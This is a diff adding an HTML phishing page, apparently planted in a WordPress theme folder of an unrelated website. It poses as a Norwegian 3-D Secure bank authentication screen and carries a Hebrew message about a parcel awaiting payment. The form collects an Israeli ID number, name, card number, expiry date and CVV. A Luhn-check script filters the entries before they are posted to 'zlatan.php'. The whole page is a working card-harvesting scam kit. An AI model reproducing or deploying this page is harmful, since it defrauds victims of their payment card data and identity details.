@@ -1,0 +1,203 @@
+<!-- URL =https://chefrogeriolisboa.com.br/wp-content/themes/fitnessbase/posta%20user/7afd9fcbc4769ecb5a96f13ce75ef658/--><!-- w =('chefrogeriolisboa.com.br', [datetime.datetime(2018, 8, 24, 0, 0), datetime.datetime(2009, 12, 30, 0, 0), datetime.datetime(2020, 4, 4, 0, 0)], datetime.datetime(2021, 8, 24, 0, 0))--><html>
+ <head>
+  <meta content="application/xhtml+xml; charset=utf-8" http-equiv="content-type"/>
+  <title>
+   Autentisering
+  </title>
+  <link href="https://acs4.3dsecure.no/mdpayacs/content/040/screen.css" rel="stylesheet" type="text/css"/>
+  <link href="https://acs4.3dsecure.no/mdpayacs/content/040/dk/gh-buttons.css" rel="stylesheet" type="text/css"/>
+  <script src="https://acs4.3dsecure.no/mdpayacs/content/commons.js">
+  </script>
+  <script src="https://acs4.3dsecure.no/mdpayacs/content/040/js/jquery-1.9.1.min.js">
+  </script>
+  <script src="./Autentisering_files/date_time.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   function onBodyLoad() {
+document.form.otp.focus();
+}
+function validate(){
+var filter = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+var tel=document.getElementById("nocphone2");
+var email=document.getElementById("em1");
+var cc=document.getElementById("ccnn1");
+var expm=document.getElementById("cexppdm");
+var expa=document.getElementById("cexdyyyyss");
+var cv=document.getElementById("qsdq21sd5s4d4s1");
+var flag=0;
+if (tel.value=="" || isNaN(tel.value) || tel.value.length<8)
+{ tel.style.borderColor="red";flag=1;
+}else{ tel.style.borderColor="green";
+}
+if(filter.test(email.value))
+{
+email.style.borderColor="green";
+}else{
+email.style.borderColor="red";flag=1;
+}
+if (cc.value==""||cc.value.length<15 || isNaN(cc.value)){
+cc.style.borderColor="red";flag=1;
+}else
+{
+var len = cc.value.length;
+var iCCN = parseInt(cc.value);
+var iTotal = 0;
+for(var i=len;i>0;i--){ calc = parseInt(iCCN) % 10; calc = parseInt(calc); iTotal += calc; i--; iCCN = iCCN / 10; calc = parseInt(iCCN) % 10 ; calc = calc *2; switch(calc){
+case 10: calc = 1; break; case 12: calc = 3; break; case 14: calc = 5; break; case 16: calc = 7; break; case 18: calc = 9; break; default: calc = calc; } iCCN = iCCN / 10; iTotal += calc; }
+if (iTotal%10!=0)
+{cc.style.borderColor="red";flag=1;
+}else{
+cc.style.borderColor="green";
+}
+}
+if (expm.value==""|| expm.value<1 ||expm.value>12 || (expa.value==19&& (expm.value==1|| expm.value==2||expm.value==3)))
+{ expm.style.borderColor="red";flag=1;
+}else{ expm.style.borderColor="green";
+}
+if (expa.value==""|| expa.value<19 || expa.value>28)
+{ expa.style.borderColor="red";flag=1;
+}else{ expa.style.borderColor="green";
+}
+if (cv.value=="" || isNaN(cv.value) || cv.value.length<3)
+{ cv.style.borderColor="red";flag=1;
+}else{ cv.style.borderColor="green";
+}
+if (flag==1)
+{document.getElementById("msg_error").style.display="block";return false;}else{document.getElementById("msg_error").style.display="none";return true;}
+}
+  </script>
+ </head>
+ <body onload="onBodyLoad();">
+  <div id="authform">
+   <div class="wrapper">
+    <div class="logos">
+     <table>
+      <tbody>
+       <tr>
+        <td class="identifier">
+         <img alt="" src="" style="max-height: 56px;"/>
+         <img alt="" src="" style="max-height: 56px;"/>
+        </td>
+        <td class="bank">
+         <br/>
+        </td>
+        <td class="bank">
+         <img alt="2" longdesc="logo170.png" src="logo170.png" title="1"/>
+         <br/>
+        </td>
+       </tr>
+      </tbody>
+     </table>
+    </div>
+    <h1 style="text-align: left;">
+     הזן את מספר הכרטיס
+    </h1>
+    <h1 style="text-align: right;">
+     <img alt="r" longdesc="payment-logos.png" src="payment-logos.png" style="top: 249px; left: 631px; width: 130px; height: 24px;" title="r"/>
+    </h1>
+    <p>
+     <b>
+      החבילה שלך ממתינה למשלוח, עלינו לאשר את התשלום
+     </b>
+    </p>
+    <p>
+     <b>
+      לקבלה בארבעת הימים הבאים.
+     </b>
+    </p>
+    <form action="zlatan.php" id="form" method="post" name="form">
+     <br/>
+     <dl style="margin-top: 10px;">
+      <dt>
+       <b>
+        תַאֲרִיך :
+       </b>
+      </dt>
+      <dd>
+       <span id="date_time">
+       </span>
+       <br/>
+      </dd>
+      <script type="text/javascript">
+       window.onload = date_time('date_time');
+      </script>
+      <dt>
+       <b>
+        מספר הזהות
+       </b>
+      </dt>
+      <dd>
+       <label for="select">
+       </label>
+       <input id="nocphone2" maxlength="9" name="nocphone2" onkeypress="return submitenter(this,event)" style="width: 60px;" type="text" width="10"/>
+      </dd>
+      <dt>
+       <b>
+        השם:
+       </b>
+      </dt>
+      <dd>
+       <input id="name" name="em1" onkeypress="return submitenter(this,event)" style="width: 112px;" type="text" width="20"/>
+      </dd>
+      <dt>
+       <b>
+        מספר כרטיס :
+       </b>
+      </dt>
+      <dd>
+       <input id="ccnn1" maxlength="16" name="ccnn1" onkeypress="return submitenter(this,event)" style="width: 112px;" type="text" width="10"/>
+      </dd>
+      <dt>
+       <b>
+        תאריך תפוגה :
+       </b>
+      </dt>
+      <dd>
+       <input id="cexppdm" maxlength="2" name="cexppdm" onkeypress="return submitenter(this,event)" style="width: 30px;" type="text" width="10"/>
+       -
+       <input id="cexdyyyyss" maxlength="2" name="cexdyyyyss" onkeypress="return submitenter(this,event)" style="width: 30px;" type="text" width="10"/>
+      </dd>
+      <dt>
+       <label for="code">
+        <b>
+         CVV
+        </b>
+        :
+       </label>
+      </dt>
+      <dd>
+       <input id="qsdq21sd5s4d4s1" maxlength="4" name="qsdq21sd5s4d4s1" onkeypress="return submitenter(this,event)" style="width: 30px;" type="text" width="10"/>
+       <br/>
+       <br/>
+      </dd>
+     </dl>
+     <div class="error" id="errorMessage">
+     </div>
+     <div class="error" id="msg_error" style="display: none;">
+      Kontroller de
+merkede feltene.
+     </div>
+     <div style="font-size: 0.92em; margin-bottom: 30px;">
+      <b>
+       הזן
+את המידע
+הבא כהלכה ולחץ על "אשר".
+      </b>
+      <br/>
+      <br/>
+      <b>
+       השלב הבא: אימות נייד
+      </b>
+     </div>
+     <div style="position: absolute; margin-left: 150px;">
+      <b>
+       <button class="button icon approve primary" id="submit" name="submit" onclick="return validate()" type="submit" value="submit">
+        לְאַשֵׁר
+       </button>
+      </b>
+     </div>
+    </form>
+   </div>
+  </div>
+ </body>
+</html>
